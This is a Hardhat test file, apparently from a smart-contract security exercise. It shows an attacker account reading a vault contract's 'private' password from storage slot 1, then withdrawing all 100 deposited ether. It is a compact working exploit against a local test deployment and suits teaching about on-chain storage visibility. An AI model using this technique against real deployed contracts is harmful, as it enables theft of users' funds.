const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault Problem", () => {
  let deployer, attacker;

  beforeEach(async () => {
    [deployer, attacker] = await ethers.getSigners();
    const VaultProb = await ethers.getContractFactory("VaultProb", deployer);
    this.vaultProb = await VaultProb.deploy(
      ethers.utils.formatBytes32String("myPassword")
    );
    await this.vaultProb.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("should be possible to access to its private variables", async () => {
    let initialBalanceContract = await ethers.provider.getBalance(
      this.vaultProb.address
    );
    let initialBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );
    console.log(
      `Contract's Initial Balance: ${ethers.utils.formatEther(
        initialBalanceContract.toString()
      )}`
    );
    console.log(
      `Attackers's Initial Balance: ${ethers.utils.formatEther(
        initialBalanceAttacker.toString()
      )}`
    );

    // here we are passing index 1 because ownable variable will be at index 0 therefore password will be at 1
    let pwd = await ethers.provider.getStorageAt(this.vaultProb.address, 1);

    let password = await ethers.utils.parseBytes32String(pwd);
    console.log("===========================");
    console.log(`= password: ${password} =`);
    console.log("===========================");

    await this.vaultProb.connect(attacker).withdraw(pwd);

    let finalBalanceContract = await ethers.provider.getBalance(
      this.vaultProb.address
    );
    let finalBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );
    console.log(
      `Contract's Final Balance: ${ethers.utils.formatEther(
        finalBalanceContract.toString()
      )}`
    );
    console.log(
      `Attackers's Final Balance: ${ethers.utils.formatEther(
        finalBalanceAttacker.toString()
      )}`
    );

    expect(finalBalanceContract).to.eq(0);
    expect(initialBalanceContract).to.eq(ethers.utils.parseEther("100"));
    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
  });
});
